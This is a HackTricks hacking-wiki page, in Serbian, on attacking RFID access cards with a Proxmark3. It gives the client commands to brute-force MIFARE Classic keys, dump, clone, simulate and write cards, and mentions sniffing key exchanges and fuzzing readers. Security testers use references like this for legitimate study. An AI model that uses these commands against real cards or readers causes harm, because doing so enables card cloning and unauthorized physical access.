# Proxmark 3

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Napad na RFID sisteme sa Proxmark3

Prva stvar koju treba da uradite je da imate [**Proxmark3**](https://proxmark.com) i [**instalirate softver i njegove zavisnosti**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### Napad na MIFARE Classic 1KB

Ima **16 sektora**, svaki od njih ima **4 bloka** i svaki blok sadrži **16B**. UID se nalazi u sektoru 0 bloku 0 (i ne može se menjati).\
Da biste pristupili svakom sektoru, potrebna su vam **2 ključa** (**A** i **B**) koja su smeštena u **bloku 3 svakog sektora** (sektorski trailer). Sektorski trailer takođe čuva **pristupne bitove** koji daju **dozvole za čitanje i pisanje** na **svakom bloku** koristeći 2 ključa.\
2 ključa su korisna za davanje dozvola za čitanje ako znate prvi i pisanje ako znate drugi (na primer).

Mogu se izvršiti nekoliko napada
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Proxmark3 omogućava izvođenje drugih akcija kao što je **prisluškivanje** komunikacije između **Tag-a i Čitača** kako bi se pokušalo pronaći osetljive podatke. Na ovoj kartici možete jednostavno presresti komunikaciju i izračunati korišćeni ključ jer su **kriptografske operacije slabe** i poznavajući običan i šifrovani tekst možete ga izračunati (alat `mfkey64`).

### Raw Commands

IoT sistemi ponekad koriste **nebrendirane ili nekomercijalne tagove**. U ovom slučaju, možete koristiti Proxmark3 za slanje prilagođenih **raw komandi tagovima**.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
Sa ovom informacijom možete pokušati da potražite informacije o kartici i o načinu komunikacije sa njom. Proxmark3 omogućava slanje sirovih komandi kao što su: `hf 14a raw -p -b 7 26`

### Skripte

Proxmark3 softver dolazi sa unapred učitanom listom **automatskih skripti** koje možete koristiti za obavljanje jednostavnih zadataka. Da biste dobili punu listu, koristite komandu `script list`. Zatim, koristite komandu `script run`, praćenu imenom skripte:
```
proxmark3> script run mfkeys
```
Možete kreirati skriptu za **fuzz tag čitače**, tako što ćete kopirati podatke sa **validne kartice** jednostavno napišite **Lua skriptu** koja **randomizuje** jedan ili više nasumičnih **bajtova** i proverite da li **čitač pada** sa bilo kojom iteracijom.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
